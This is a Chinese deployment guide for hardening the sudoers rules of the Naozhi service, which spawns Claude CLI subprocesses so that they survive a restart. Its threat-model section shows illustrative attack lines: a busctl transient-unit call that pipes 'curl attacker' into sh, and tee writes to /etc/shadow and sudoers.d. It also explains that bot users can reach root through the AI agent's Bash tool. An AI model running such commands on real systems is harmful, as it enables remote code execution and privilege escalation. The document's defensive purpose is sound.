# Naozhi sudoers 精确化

> 目标：零停机重启（shim 存活）所需的最小 root 权限。默认部署**不配置**这份 sudoers 时，shim 仍会工作但无法在 `systemctl restart naozhi` 后存活 —— 失败路径会在 journal 中打印 `WARN moveToShimsCgroup: ...` 并继续，**不致命**。

## 背景

`internal/shim/manager.go` 为了让 shim/CLI 子进程在 `naozhi.service` 重启时存活，需要把它们从 naozhi 自己的 cgroup 搬到独立 cgroup：

- **主路径**：`sudo -n busctl call org.freedesktop.systemd1 ... StartTransientUnit` 创建 `naozhi-shim-<PID>.scope` 并把 PID(s) adopted 进去。新 scope `KillMode=none`，systemd 在 naozhi.service 停止时不会 kill 它们。
- **兜底路径**：`sudo -n tee /sys/fs/cgroup/naozhi-shims/cgroup.procs` 直接写 procs 文件，把 PID 挪到根级 cgroup（较脆弱，systemd restart 仍可能清理）。

两条都需要 `sudo`，因为 `/sys/fs/cgroup` 挂载和 D-Bus `StartTransientUnit` 都由 systemd 强制 root。

## 威胁模型

naozhi 用户（生产部署中通常是 `ec2-user` 或专用服务账号）在**运行时**会 spawn Claude CLI 子进程。Claude CLI 接受用户输入并拥有 `Bash` 工具权限，这意味着**任何**能发消息给 bot 的人通过 Claude 的 Bash 工具间接获得 naozhi 用户权限。

如果 sudoers 写成：

```
ec2-user ALL=(root) NOPASSWD: ALL
```

或更隐蔽的：

```
ec2-user ALL=(root) NOPASSWD: /usr/bin/busctl
```

那么攻击者可以：

- `sudo busctl call org.freedesktop.systemd1 ... StartTransientUnit ... "ExecStart" "aa{sv}" 1 "/bin/sh" "-c" "curl attacker | sh"` 创建任意 scope 执行任意命令
- `sudo busctl ... | sudo tee /etc/shadow` 任意文件写
- `sudo tee /etc/sudoers.d/pwn` 提权

**正确做法**：sudoers 必须 pin 完整 argv（除了 naozhi runtime 已知变化的 PID 数字 / scope 名），让 sudo 在执行前拒绝任何偏离模板的命令。

## 启用精确策略

### 1. 前置检查

确认生产服务用户（下面以 `ec2-user` 为例，**按实际部署调整**）：

```bash
systemctl cat naozhi | grep ^User=
# 期望输出: User=ec2-user
```

### 2. 安装 sudoers 模板

```bash
# 复制模板到本地编辑（按需改用户名）
cp deploy/naozhi-sudoers.example /tmp/naozhi-sudoers
$EDITOR /tmp/naozhi-sudoers   # 修改 ec2-user → 你的服务用户

# **关键**：用 visudo 校验再装
sudo visudo -c -f /tmp/naozhi-sudoers
# 必须输出 "parsed OK"，否则不要继续

# 装进 sudoers.d（注意权限）
sudo install -m 440 -o root -g root /tmp/naozhi-sudoers /etc/sudoers.d/naozhi
rm /tmp/naozhi-sudoers
```

> **如果 `visudo -c` 失败不要继续**。一个语法错误的 `/etc/sudoers.d/naozhi` 会让 `sudo` 在多数发行版上完全拒绝服务，恢复需要 single-user 模式或其它 root 凭据。

### 3. 端到端验证

```bash
# 重启服务触发 moveToShimsCgroup
sudo systemctl restart naozhi

# 创建一个会话（触发 shim spawn → 进而触发 sudo busctl 调用）
curl -X POST http://127.0.0.1:8180/api/sessions/send \
  -H "Authorization: Bearer $NAOZHI_DASHBOARD_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"key":"dashboard:direct:sudo-smoke","text":"hi","workspace":"/tmp"}'

# 检查 journal：应看到 "moved shim to independent systemd scope"，
# 不能看到 "moveToShimsCgroup: systemd scope failed"
sudo journalctl -u naozhi --since "1 minute ago" | grep -i 'moved shim\|systemd scope failed'

# 验证 scope 确实建出来了
systemctl --type=scope | grep naozhi-shim-
```

出现 `systemd scope failed` 且紧跟 `moveToShimsCgroupDirect: failed` → sudoers 规则没匹配上（很可能 argv 漂移），走到了 README 里的"降级模式"。检查 sudo 日志：`sudo journalctl _COMM=sudo -n 20`。

## 降级语义：不装也能跑

如果运维不愿意给任何 sudo 权限：

- naozhi 服务正常启动，IM / Dashboard / 会话全部工作
- 每次 `systemctl restart naozhi` 会 **kill 所有 shim 子进程**（因为它们仍在 naozhi.service 的 cgroup 里）
- journal 里每次 restart 期间会打印 `WARN` 而非 `ERROR`
- 用户体验：运行中的会话被打断，需要操作员 resume

这对「开发机 / 低频重启」的部署完全可接受。`deploy/naozhi-sudoers.example` 仅对「长期高可用 + 频繁热更新」的生产场景需要。

## 替代方案：用户级 systemd

如果组织禁止 sudoers.d，但希望零停机：把 naozhi 改成**用户级** systemd 单元（`systemctl --user`）+ lingering。用户级 systemd 不需要 sudo 就能创建 transient scope。代价：

- 日志走用户级 journald，整合到运维平台麻烦
- ALB → EC2 反向代理路由 / systemd `Restart=always` 语义略有差别
- 需要 `loginctl enable-linger ec2-user` 让服务在无 login 会话时仍活

这种方案尚未在 naozhi 实际验证，列在此作备选。

## 回归保护

`internal/shim/manager_sudoers_argv_test.go` 锁定 `moveToShimsCgroup` 与 `moveToShimsCgroupDirect` emit 的 argv 字面量。修改这两个函数**必定**更新该测试 + 同步更新 `deploy/naozhi-sudoers.example` 的 `Cmnd_Alias`。不跟进会让生产 sudoers 静默拒绝 → journal 噪声 + shim 无法持久化。

## 验收清单

- [ ] `visudo -c -f /etc/sudoers.d/naozhi` 退出码 0
- [ ] `systemctl restart naozhi` 后 `journalctl -u naozhi --since "2m"` 看到 `moved shim to independent systemd scope`
- [ ] `systemctl --type=scope | grep naozhi-shim-` 至少返回 1 行
- [ ] 故意发错 sudo 指令：`sudo -n busctl call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager ListUnits` **必须**被拒（policy 仅允许 StartTransientUnit）
